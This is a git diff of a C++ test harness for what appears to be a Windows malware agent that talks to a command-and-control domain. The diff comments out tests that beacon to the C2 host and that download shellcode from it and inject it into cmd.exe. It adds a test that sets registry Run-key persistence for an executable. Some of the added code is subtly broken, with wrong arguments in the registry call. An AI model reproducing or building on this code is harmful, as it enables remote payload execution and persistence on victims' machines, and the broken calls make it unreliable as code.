@@ -75,17 +75,17 @@ void test_aesgcm() {
 }
 
 void test_http() {
-    std::string message = "Test message";
+    // std::string message = "Test message";
 
-    std::cout << "sending get request\n";
-    std::string getResponse = httpGet(c2Domain, port, testURI);
+    // std::cout << "sending get request\n";
+    // std::string getResponse = httpGet(c2Domain, port, testURI);
 
-    std::cout << getResponse << std::endl;
+    // std::cout << getResponse << std::endl;
 
-    std::cout << "sending post request\n";
-    std::string response = httpPost(c2Domain, port, testURI, message);
+    // std::cout << "sending post request\n";
+    // std::string response = httpPost(c2Domain, port, testURI, message);
 
-    std::cout << response << std::endl;
+    // std::cout << response << std::endl;
 
     // BYTE testBytes[] = {0x87, 0xb8, 0xa9, 0xa6, 0xc2, 0x39, 0x42, 0x5f, 0xc2, 0xda, 0x8c, 0xc1, 0xb5, 0x6a,
     //                     0x9b, 0x69, 0x26, 0x0e, 0x79, 0x75, 0xe5, 0x81, 0x29, 0xe0, 0x6d, 0x68, 0xb3, 0x62, 
@@ -99,12 +99,28 @@ void test_http() {
 void test_inject()
 {
     
-    std::string exePath = "C:\\WINDOWS\\System32\\cmd.exe";
-    std::string response = httpRequest(L"GET", c2Domain, port, L"/agent/get_shellcode", "");
-    std::cout << response.size() << std::endl;
-    char* shellcode = &*response.begin();
-    printHexArray((BYTE*) shellcode, 10);
-    std::cout << inject(exePath, shellcode, response.size()) << std::endl;
+    // std::string exePath = "C:\\WINDOWS\\System32\\cmd.exe";
+    // std::string response = httpRequest(L"GET", c2Domain, port, L"/agent/get_shellcode", "");
+    // std::cout << response.size() << std::endl;
+    // char* shellcode = &*response.begin();
+    // printHexArray((BYTE*) shellcode, 10);
+    // std::cout << inject(exePath, shellcode, response.size()) << std::endl;
+}
+
+void test_persistence()
+{
+    // LPTSTR pwd;
+    // DWORD pwdSize = GetCurrentDirectoryA(0, NULL);
+    // pwd = (LPTSTR) malloc(pwdSize);
+    // GetCurrentDirectory(pwdSize, pwd);
+    // std::cout << buffer << std::endl;
+    std::wstring progPath = L"D:\\test\\testimp.exe";
+    HKEY hkey = NULL;
+    LONG createStatus = RegCreateKeyExA(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key     
+    printf("create status: %d", createStatus);
+
+    LONG status = RegSetValueEx(hkey, L"MyApp", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));
+    printf("status: %d", status);
 }
 
 int main(int argc, char* argv[])
@@ -124,6 +140,8 @@ int main(int argc, char* argv[])
         test_http();
     } else if (test_name == "inject") {
         test_inject();
+    } else if (test_name == "persistence") {
+        test_persistence();
     } else {
         std::cout << "test name invalid" << std::endl;
     }
